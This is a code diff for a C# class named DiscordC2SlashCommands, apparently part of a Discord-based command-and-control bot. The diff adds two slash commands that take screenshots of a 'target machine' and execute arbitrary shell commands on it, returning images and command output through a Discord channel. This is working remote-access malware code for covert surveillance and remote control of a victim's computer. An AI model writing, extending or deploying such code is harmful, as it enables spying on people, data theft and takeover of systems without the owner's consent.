@@ -4,16 +4,35 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
 {
     public InteractionService Commands { get; set; }
 
-    [SlashCommand("first-global-command", "sdfsdf")]
-    public async Task FirstGlobalCommand()
+    [SlashCommand("screenshot", "take a screenshot of the target machine")]
+    public async Task Screenshot()
     {
         await DeferAsync();
-        await FollowupAsync($"first");
+        await FollowupWithFileAsync(Utils.GetScreenshot(), "screenshot.png");
     }
 
-    [SlashCommand("test", "sdfsdf")]
-    public async Task Test()
+    [SlashCommand("execute_command", "execute a command on the target machine")]
+    public async Task Execute(string command)
     {
-        await RespondAsync($"tsetsdfkshf");
+        await DeferAsync();
+        string output = Utils.ExecuteCommandline(command);
+
+        if (output == null)
+        {
+            await FollowupAsync("error");
+            return;
+        }
+
+        if (output.Length > 2000-8) {
+            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
+            foreach (string chunk in chunks)
+            {
+                await Context.Channel.SendMessageAsync(chunk);
+            }
+            await FollowupAsync("executed");
+        } else {
+            await FollowupAsync($"```\n{output}\n```");
+        }
+        
     }
 }
